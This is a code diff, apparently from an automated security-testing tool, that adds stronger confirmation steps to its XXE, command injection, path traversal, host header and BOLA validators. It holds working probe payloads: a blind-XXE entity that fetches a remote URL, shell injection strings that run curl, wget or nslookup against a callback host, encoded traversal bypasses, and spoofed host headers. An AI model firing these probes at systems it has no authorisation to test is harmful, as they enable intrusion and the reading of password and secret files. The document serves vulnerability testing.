       /sbin\/nologin/,
     ];
-
-    const hasPasswd = passwdIndicators.some(p => p.test(result.stdout));
-
-    // Check for hostname/other file content indicators
     const fileContentIndicators = [
-      /\[extensions\]/i,  // win.ini
-      /\[fonts\]/i,        // win.ini
-      /PRETTY_NAME=/,      // os-release
-      /VERSION_ID=/,       // os-release
+      /\[extensions\]/i,
+      /\[fonts\]/i,
+      /PRETTY_NAME=/,
+      /VERSION_ID=/,
     ];
+    const hasPasswd = passwdIndicators.some(p => p.test(result.stdout));
     const hasFileContent = fileContentIndicators.some(p => p.test(result.stdout));
 
     evidence.push({
       type: 'http_response',
-      description: 'Response from XXE payload',
+      description: 'Response from XXE payload (direct-echo probe)',
       data: result.stdout.substring(0, 5000),
       timestamp: Date.now(),
     });
 
-    const confirmed = hasPasswd || hasFileContent;
+    steps.push(`Direct-echo probe → /etc/passwd:${hasPasswd ? 'YES' : 'no'}, other:${hasFileContent ? 'YES' : 'no'}`);
+
+    let confirmed = hasPasswd || hasFileContent;
     let confidence = finding.confidence;
     if (hasPasswd) confidence = Math.min(100, confidence + 35);
     if (hasFileContent) confidence = Math.min(100, confidence + 25);
 
-    steps.push(`Sent XXE payload to: ${finding.target}`);
-    steps.push(`File content (/etc/passwd) detected: ${hasPasswd ? 'YES' : 'no'}`);
-    steps.push(`Other file content detected: ${hasFileContent ? 'YES' : 'no'}`);
+    // Step 2: Blind-XXE probe via OOB DTD fetch. Only fire if the direct
+    // echo didn't already confirm — saves ~2s of waiting on easy hits.
+    let blindOobConfirmed = false;
+    if (!confirmed && validatorOobServer) {
+      const callback = validatorOobServer.generateCallbackUrl({
+        vulnerabilityType: 'xxe',
+        target: finding.target,
+        parameter: 'xml-body',
+        agentId: finding.agentId ?? 'validator',
+      });
+      const oobUrl = validatorOobServer.getHttpUrl(callback);
+
+      // Classic blind-XXE payload: external parameter entity references
+      // the OOB DTD. When the parser dereferences the entity to build the
+      // document, it fetches the OOB URL.
+      const xxePayload = [
+        `<?xml version="1.0" encoding="UTF-8"?>`,
+        `<!DOCTYPE foo [`,
+        `  <!ENTITY % remote SYSTEM "${oobUrl}">`,
+        `  %remote;`,
+        `]>`,
+        `<foo>huntress-xxe-probe</foo>`,
+      ].join('\n');
+
+      steps.push(`Blind-XXE probe → POST XML body referencing ${oobUrl}`);
+      await config.executeCommand(
+        buildCurlArgv({
+          url: finding.target, method: 'POST',
+          body: xxePayload, contentType: 'application/xml',
+          authHeaders: config.authHeaders, authCookies: config.authCookies,
+        }),
+        finding.target
+      );
+      await sleep(3000);
+
+      if (validatorOobServer.isTriggered(callback.id)) {
+        blindOobConfirmed = true;
+        confirmed = true;
+        confidence = Math.min(100, confidence + 40);
+        const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
+        evidence.push({
+          type: 'callback',
+          description: `Blind XXE OOB callback: XML parser fetched our remote DTD`,
+          data: `Callback ID: ${callback.id}\nOOB URL: ${oobUrl}\nSource IP: ${cb?.interaction?.sourceIp ?? 'unknown'}\nProtocol: ${cb?.interaction?.protocol ?? 'unknown'}\nPayload:\n${xxePayload}`,
+          timestamp: Date.now(),
+        });
+        evidence.push({
+          type: 'http_request',
+          description: 'XXE payload sent to target',
+          data: xxePayload,
+          timestamp: Date.now(),
+        });
+        steps.push(`✓ BLIND XXE CONFIRMED via OOB DTD fetch`);
+      } else {
+        steps.push(`Blind-XXE probe: no OOB callback within 3s`);
+      }
+    } else if (!confirmed) {
+      steps.push('OOB server not available — blind-XXE probe skipped');
+    }
 
     return {
       findingId: finding.id,
@@ -874,13 +1262,24 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'xxe',
+      validatorUsed: blindOobConfirmed
+        ? 'xxe_blind_oob'
+        : (hasPasswd || hasFileContent)
+          ? 'xxe_direct_echo'
+          : 'xxe',
       validationTime: Date.now() - startTime,
     };
   },
 });
 
 // ─── Command Injection Validator ────────────────────────────────────────────
+// Three confirmation paths:
+//   1. Command-output indicators in response body (uid=/Linux/etc/passwd).
+//   2. Timing anomaly — baseline vs. original payload (delay shells hit here).
+//   3. Active OOB injection — synthesize a `curl OOB` / `wget OOB` payload,
+//      substitute into the target's URL-param slot, wait for a callback.
+//      Same pattern as the SSRF active-OOB branch; deterministic proof that
+//      shell exec happened server-side.
 
 registerValidator({
   vulnType: 'command_injection',
@@ -895,14 +1294,12 @@ registerValidator({
       finding.target
     );
 
-    // Check for common command output indicators
     const cmdOutputIndicators = [
-      /uid=\d+\(\w+\)\s+gid=\d+/,       // id command output
-      /\w+\\\w+/,                          // whoami on Windows (DOMAIN\user)
-      /Linux\s+\S+\s+\d+\.\d+/,           // uname -a output
-      /root:x:0:0:/,                       // cat /etc/passwd
+      /uid=\d+\(\w+\)\s+gid=\d+/,
+      /\w+\\\w+/,
+      /Linux\s+\S+\s+\d+\.\d+/,
+      /root:x:0:0:/,
     ];
-
     const hasCmdOutput = cmdOutputIndicators.some(p => p.test(result.stdout));
 
     evidence.push({
@@ -915,7 +1312,7 @@ registerValidator({
     steps.push(`Sent injection payload to: ${finding.target}`);
     steps.push(`Command output indicators found: ${hasCmdOutput ? 'YES' : 'no'}`);
 
-    // Step 2: Time-based confirmation — send baseline then delay payload
+    // Step 2: Time-based confirmation — baseline without payload vs. original.
     const cleanTarget = finding.target.replace(/[;&|`$()]+.*$/, '');
     const baselineResult = await config.executeCommand(
       buildCurlArgv({
@@ -949,10 +1346,60 @@ registerValidator({
     steps.push(`Injected response time: ${delayTime.toFixed(0)}ms`);
     steps.push(`Time difference: ${timeDiff.toFixed(0)}ms (threshold: 4000ms)`);
 
-    const confirmed = hasCmdOutput || hasTimingAnomaly;
+    // Step 3: Active OOB injection. Substitute a shell-exec'd curl to our
+    // OOB host into the URL-param slot. If the server runs the command,
+    // the OOB server sees a DNS/HTTP hit on our unique subdomain.
+    let oobConfirmed = false;
+    if (validatorOobServer) {
+      const callback = validatorOobServer.generateCallbackUrl({
+        vulnerabilityType: 'command_injection',
+        target: finding.target,
+        parameter: 'cmd',
+        agentId: finding.agentId ?? 'validator',
+      });
+      const oobUrl = validatorOobServer.getHttpUrl(callback);
+      // Backtick + $() variants handle different shell contexts. nslookup/curl
+      // variants handle different tool availability inside the target.
+      const shellPayloads = [
+        `;curl ${oobUrl}`,
+        `$(curl ${oobUrl})`,
+        `\`curl ${oobUrl}\``,
+        `|wget -qO- ${oobUrl}`,
+        `;nslookup ${callback.callbackUrl}`,
+      ];
+
+      for (const payload of shellPayloads) {
+        const probeUrl = substituteUrlValue(finding.target, payload);
+        steps.push(`Active OOB probe: ${payload}`);
+        await config.executeCommand(
+          buildCurlArgv({ url: probeUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
+          finding.target
+        );
+        await sleep(2000);
+        if (validatorOobServer.isTriggered(callback.id)) {
+          oobConfirmed = true;
+          const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
+          evidence.push({
+            type: 'callback',
+            description: `Shell exec OOB callback via ${payload}`,
+            data: `Callback ID: ${callback.id}\nPayload: ${payload}\nSource IP: ${cb?.interaction?.sourceIp ?? 'unknown'}`,
+            timestamp: Date.now(),
+          });
+          steps.push(`✓ Shell exec CONFIRMED via ${payload}`);
+          break;
+        }
+      }
+
+      if (!oobConfirmed) steps.push('Active OOB: no callback after all shell variants');
+    } else {
+      steps.push('OOB server not available — active shell-exec probe skipped');
+    }
+
+    const confirmed = hasCmdOutput || hasTimingAnomaly || oobConfirmed;
     let confidence = finding.confidence;
     if (hasCmdOutput) confidence = Math.min(100, confidence + 30);
     if (hasTimingAnomaly) confidence = Math.min(100, confidence + 25);
+    if (oobConfirmed) confidence = Math.min(100, confidence + 40);
 
     return {
       findingId: finding.id,
@@ -960,13 +1407,63 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'command_injection',
+      validatorUsed: oobConfirmed
+        ? 'command_injection_oob'
+        : hasCmdOutput
+          ? 'command_injection_output'
+          : hasTimingAnomaly
+            ? 'command_injection_timing'
+            : 'command_injection',
       validationTime: Date.now() - startTime,
     };
   },
 });
 
 // ─── Path Traversal Validator ───────────────────────────────────────────────
+// File-content indicator scan across multiple encoding bypass variants. The
+// agent's original payload is tried first; if none of the fingerprints hit,
+// we swap `../` for `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `....//`, and
+// `..\..\` and try each. First variant whose response contains /etc/passwd,
+// win.ini, web.xml, or .env fingerprints wins — with a clean-URL negative
+// control to reject page-default content that happens to match.
+
+/** Build encoding bypass variants of a path-traversal URL.
+ *  Exported for unit tests. */
+export function buildPathTraversalVariants(url: string): Array<{ label: string; url: string }> {
+  const variants: Array<{ label: string; url: string }> = [
+    { label: 'original', url },
+  ];
+  const replacements: Array<[string, RegExp, string]> = [
+    ['url-encoded', /\.\.\//g, '%2e%2e%2f'],
+    ['double-url-encoded', /\.\.\//g, '%252e%252e%252f'],
+    ['mixed-encoding', /\.\.\//g, '..%2f'],
+    ['overlong', /\.\.\//g, '....//'],
+    ['backslash', /\.\.\//g, '..\\'],
+  ];
+  for (const [label, pattern, repl] of replacements) {
+    if (!pattern.test(url)) continue;
+    const mutated = url.replace(pattern, repl);
+    if (mutated !== url) variants.push({ label, url: mutated });
+  }
+  return variants;
+}
+
+function detectTraversedFile(stdout: string): { kind: string; confidenceDelta: number } | null {
+  if ([/root:x?:0:0:/, /daemon:x?:\d+:\d+:/, /nobody:x?:\d+:\d+:/, /sbin\/nologin/].some(p => p.test(stdout))) {
+    return { kind: '/etc/passwd', confidenceDelta: 35 };
+  }
+  if ([/\[extensions\]/i, /\[fonts\]/i, /\[mci extensions\]/i].some(p => p.test(stdout))) {
+    return { kind: 'Windows win.ini', confidenceDelta: 30 };
+  }
+  if ([/<web-app/i, /<servlet>/i, /<servlet-mapping>/i].some(p => p.test(stdout))) {
+    return { kind: 'Java web.xml', confidenceDelta: 25 };
+  }
+  if ([/DB_PASSWORD=/i, /API_KEY=/i, /SECRET_KEY=/i].some(p => p.test(stdout))
+      || /^[A-Z_]+=.+$/m.test(stdout)) {
+    return { kind: '.env', confidenceDelta: 20 };
+  }
+  return null;
+}
 
 registerValidator({
   vulnType: 'path_traversal',
@@ -975,65 +1472,62 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    const result = await config.executeCommand(
-      buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
-      finding.target
-    );
+    // Clean-URL negative control — strip the traversal fragment to get the
+    // bare endpoint, so we can distinguish payload-induced file leaks from
+    // static content that happens to match our fingerprints.
+    const cleanUrl = finding.target.replace(/(\.\.\/|%2e%2e%2f|\.\.\\\\|....\/\/).*$/i, '');
+    if (cleanUrl !== finding.target) {
+      const cleanResult = await config.executeCommand(
+        buildCurlArgv({ url: cleanUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
+        finding.target
+      );
+      if (detectTraversedFile(cleanResult.stdout)) {
+        steps.push(`FALSE POSITIVE: clean URL ${cleanUrl} already shows file-content indicators — path traversal cannot be confirmed from this target`);
+        return {
+          findingId: finding.id,
+          confirmed: false,
+          evidence,
+          reproductionSteps: steps,
+          confidence: Math.max(0, finding.confidence - 40),
+          validatorUsed: 'path_traversal',
+          validationTime: Date.now() - startTime,
+        };
+      }
+    }
 
-    // Check for /etc/passwd content
-    const passwdIndicators = [
-      /root:x?:0:0:/,
-      /daemon:x?:\d+:\d+:/,
-      /nobody:x?:\d+:\d+:/,
-      /sbin\/nologin/,
-    ];
-    const hasPasswd = passwdIndicators.some(p => p.test(result.stdout));
+    const variants = buildPathTraversalVariants(finding.target);
+    steps.push(`Testing ${variants.length} encoding variant(s)`);
 
-    // Check for Windows files
-    const winIndicators = [
-      /\[extensions\]/i,
-      /\[fonts\]/i,
-      /\[mci extensions\]/i,
-    ];
-    const hasWinFile = winIndicators.some(p => p.test(result.stdout));
-
-    // Check for Java web.xml
-    const javaIndicators = [
-      /<web-app/i,
-      /<servlet>/i,
-      /<servlet-mapping>/i,
-    ];
-    const hasJavaFile = javaIndicators.some(p => p.test(result.stdout));
-
-    // Check for .env file
-    const envIndicators = [
-      /^[A-Z_]+=.+$/m,
-      /DB_PASSWORD=/i,
-      /API_KEY=/i,
-      /SECRET_KEY=/i,
-    ];
-    const hasEnvFile = envIndicators.some(p => p.test(result.stdout));
-
-    evidence.push({
-      type: 'http_response',
-      description: 'Response from path traversal payload',
-      data: result.stdout.substring(0, 5000),
-      timestamp: Date.now(),
-    });
-
-    const fileDetected = hasPasswd || hasWinFile || hasJavaFile || hasEnvFile;
-    const confirmed = fileDetected;
+    let confirmed = false;
+    let firingVariant: string | null = null;
+    let detectedFile: string | null = null;
     let confidence = finding.confidence;
-    if (hasPasswd) confidence = Math.min(100, confidence + 35);
-    else if (hasWinFile) confidence = Math.min(100, confidence + 30);
-    else if (hasJavaFile) confidence = Math.min(100, confidence + 25);
-    else if (hasEnvFile) confidence = Math.min(100, confidence + 20);
 
-    steps.push(`Sent traversal payload to: ${finding.target}`);
-    steps.push(`/etc/passwd content: ${hasPasswd ? 'YES' : 'no'}`);
-    steps.push(`Windows file content: ${hasWinFile ? 'YES' : 'no'}`);
-    steps.push(`Java WEB-INF: ${hasJavaFile ? 'YES' : 'no'}`);
-    steps.push(`.env file: ${hasEnvFile ? 'YES' : 'no'}`);
+    for (const variant of variants) {
+      const result = await config.executeCommand(
+        buildCurlArgv({ url: variant.url, authHeaders: config.authHeaders, authCookies: config.authCookies }),
+        finding.target
+      );
+      const hit = detectTraversedFile(result.stdout);
+      if (!hit) {
+        steps.push(`  ${variant.label}: no file content detected`);
+        continue;
+      }
+      confirmed = true;
+      firingVariant = variant.label;
+      detectedFile = hit.kind;
+      confidence = Math.min(100, confidence + hit.confidenceDelta);
+      evidence.push({
+        type: 'http_response',
+        description: `${variant.label} bypass leaked ${hit.kind}`,
+        data: result.stdout.substring(0, 5000),
+        timestamp: Date.now(),
+      });
+      steps.push(`  ✓ ${variant.label} → ${hit.kind} leaked`);
+      break;
+    }
+
+    if (!confirmed) steps.push('No encoding variant produced file-content indicators');
 
     return {
       findingId: finding.id,
@@ -1041,7 +1535,9 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'path_traversal',
+      validatorUsed: firingVariant && detectedFile
+        ? `path_traversal (${firingVariant}, ${detectedFile})`
+        : 'path_traversal',
       validationTime: Date.now() - startTime,
     };
   },
@@ -1354,6 +1850,23 @@ registerValidator({
 });
 
 // ─── Host Header Injection Validator ────────────────────────────────────────
+// Sweeps the canonical override-header set. First variant where the injected
+// host reflects in a Location header (strongest signal — confirms routing
+// uses the attacker-controlled value) wins. A body-only reflection marks
+// "potentially exploitable" but requires a clean-request negative control
+// to rule out a page-default string that happens to contain the evil host.
+
+/** Override-header variants tried in order by the host-header validator.
+ *  Exported for unit tests. */
+export const HOST_OVERRIDE_HEADERS = [
+  'Host',
+  'X-Forwarded-Host',
+  'X-Forwarded-Server',
+  'X-Host',
+  'X-Original-URL',
+  'X-Rewrite-URL',
+  'Forwarded',
+] as const;
 
 registerValidator({
   vulnType: 'host_header_injection',
@@ -1365,97 +1878,77 @@ registerValidator({
     const targetUrl = finding.target;
     const evilHost = 'evil-attacker.com';
     let confirmed = false;
+    let firingHeader: string | null = null;
+    let reflectedInRedirect = false;
+    let reflectedInBody = false;
     let confidence = finding.confidence;
 
-    // Step 1: Send request with manipulated Host header
-    const result1 = await config.executeCommand(
-      buildCurlArgv({
-        url: targetUrl, dumpHeaders: true,
-        headers: { 'Host': evilHost },
-        authHeaders: config.authHeaders, authCookies: config.authCookies,
-      }),
-      finding.target
-    );
+    for (const headerName of HOST_OVERRIDE_HEADERS) {
+      // `Forwarded` follows RFC 7239 syntax (`host=evil`), not a bare value.
+      const headerValue = headerName === 'Forwarded' ? `host=${evilHost}` : evilHost;
 
-    evidence.push({
-      type: 'http_response',
-      description: `Response with Host: ${evilHost}`,
-      data: result1.stdout.substring(0, 5000),
-      timestamp: Date.now(),
-    });
-
-    // Check if evil host appears in response body (link generation, redirects)
-    const bodyHasEvil = result1.stdout.toLowerCase().includes(evilHost);
-    steps.push(`Sent Host: ${evilHost}`);
-    steps.push(`Evil host in response body: ${bodyHasEvil ? 'YES' : 'no'}`);
-
-    if (bodyHasEvil) {
-      confidence = Math.min(100, confidence + 25);
-    }
-
-    // Check for redirect containing evil host
-    const locationMatch = result1.stdout.match(/location:\s*(\S+)/i);
-    const redirectHasEvil = locationMatch && locationMatch[1].toLowerCase().includes(evilHost);
-
-    if (redirectHasEvil) {
-      confirmed = true;
-      confidence = Math.min(100, confidence + 35);
-      steps.push(`Redirect Location contains ${evilHost}: CONFIRMED`);
-    }
-
-    // Step 2: Test X-Forwarded-Host (common bypass when Host is validated)
-    if (!confirmed) {
-      const result2 = await config.executeCommand(
+      const result = await config.executeCommand(
         buildCurlArgv({
           url: targetUrl, dumpHeaders: true,
-          headers: { 'X-Forwarded-Host': evilHost },
+          headers: { [headerName]: headerValue },
           authHeaders: config.authHeaders, authCookies: config.authCookies,
         }),
         finding.target
       );
 
-      const xfhBody = result2.stdout.toLowerCase().includes(evilHost);
-      const xfhLocation = result2.stdout.match(/location:\s*(\S+)/i);
-      const xfhRedirect = xfhLocation && xfhLocation[1].toLowerCase().includes(evilHost);
+      const body = result.stdout.toLowerCase();
+      const bodyHit = body.includes(evilHost);
+      const locationMatch = result.stdout.match(/location:\s*(\S+)/i);
+      const redirectHit = !!locationMatch && locationMatch[1].toLowerCase().includes(evilHost);
 
-      steps.push(`X-Forwarded-Host: ${evilHost}`);
-      steps.push(`X-Forwarded-Host in body: ${xfhBody ? 'YES' : 'no'}`);
-      steps.push(`X-Forwarded-Host in redirect: ${xfhRedirect ? 'YES' : 'no'}`);
+      steps.push(`${headerName}: ${headerValue} — body:${bodyHit ? 'YES' : 'no'}, redirect:${redirectHit ? 'YES' : 'no'}`);
 
-      if (xfhBody || xfhRedirect) {
-        confidence = Math.min(100, confidence + 20);
-
+      if (bodyHit || redirectHit) {
         evidence.push({
           type: 'http_response',
-          description: `Response with X-Forwarded-Host: ${evilHost}`,
-          data: result2.stdout.substring(0, 5000),
+          description: `${headerName}: ${headerValue} reflection`,
+          data: result.stdout.substring(0, 5000),
           timestamp: Date.now(),
         });
       }
 
-      if (xfhRedirect) {
+      if (redirectHit) {
+        // Strongest signal — a server that routes/redirects based on the
+        // injected header is definitionally vulnerable. No false-positive
+        // path for this case.
         confirmed = true;
-        confidence = Math.min(100, confidence + 15);
+        firingHeader = headerName;
+        reflectedInRedirect = true;
+        confidence = Math.min(100, confidence + 40);
+        steps.push(`  ✓ CONFIRMED: ${headerName} controls Location`);
+        break;
+      }
+
+      if (bodyHit && !reflectedInBody) {
+        reflectedInBody = true;
+        firingHeader = headerName;
+        confidence = Math.min(100, confidence + 20);
       }
     }
 
-    // Step 3: Verify it's not a false positive — send with legitimate host
-    if (bodyHasEvil && !confirmed) {
-      const result3 = await config.executeCommand(
+    // Body-only reflection needs a clean-request control to confirm.
+    if (!confirmed && reflectedInBody) {
+      const cleanResult = await config.executeCommand(
         buildCurlArgv({ url: targetUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
         finding.target
       );
-
-      const cleanHasEvil = result3.stdout.toLowerCase().includes(evilHost);
-      if (cleanHasEvil) {
-        // The page always contains this string — false positive
+      if (cleanResult.stdout.toLowerCase().includes(evilHost)) {
         confidence = Math.max(0, confidence - 40);
-        steps.push('FALSE POSITIVE: clean request also contains evil host string');
+        steps.push('FALSE POSITIVE: clean request (no header injection) also contains evil host');
+        reflectedInBody = false;
+        firingHeader = null;
       } else {
         confirmed = true;
-        steps.push('Clean request does NOT contain evil host — injection confirmed');
+        steps.push(`✓ CONFIRMED: ${firingHeader} reflects in body (clean request does not)`);
       }
     }
+
+    if (!confirmed) steps.push(`All ${HOST_OVERRIDE_HEADERS.length} override headers tested; no injection confirmed`);
 
     return {
       findingId: finding.id,
@@ -1463,7 +1956,9 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'host_header_injection',
+      validatorUsed: firingHeader
+        ? `host_header_injection (${firingHeader}, ${reflectedInRedirect ? 'redirect' : 'body'})`
+        : 'host_header_injection',
       validationTime: Date.now() - startTime,
     };
   },
@@ -2258,49 +2753,12 @@ registerValidator({
   },
 });
 
-// ─── BOLA Validator (same logic as IDOR) ──────────────────────────────────
+// ─── BOLA Validator (shares idor broken-access differential) ──────────────
 
 registerValidator({
   vulnType: 'bola',
   async validate(finding, config): Promise<ValidationResult> {
-    const startTime = Date.now();
-    const evidence: ValidationEvidence[] = [];
-    const steps: string[] = [];
-
-    const result = await config.executeCommand(
-      buildCurlArgv({
-        url: finding.target, dumpHeaders: true,
-        authHeaders: config.authHeaders, authCookies: config.authCookies,
-      }),
-      finding.target
-    );
-
-    evidence.push({
-      type: 'http_response',
-      description: 'Response with manipulated object reference',
-      data: result.stdout.substring(0, 5000),
-      timestamp: Date.now(),
-    });
-
-    const statusMatch = result.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
-    const statusCode = statusMatch ? parseInt(statusMatch[1], 10) : 0;
-
-    steps.push(`Request with manipulated object ID returned status: ${statusCode}`);
-
-    const confirmed = statusCode === 200 && result.stdout.length > 200;
-    let confidence = finding.confidence;
-    if (statusCode === 200) confidence = Math.min(100, confidence + 15);
-    if (statusCode === 401 || statusCode === 403) confidence = Math.max(0, confidence - 40);
-
-    return {
-      findingId: finding.id,
-      confirmed,
-      evidence,
-      reproductionSteps: steps,
-      confidence,
-      validatorUsed: 'bola',
-      validationTime: Date.now() - startTime,
-    };
+    return validateBrokenAccess(finding, config, 'bola');
   },
 });
 
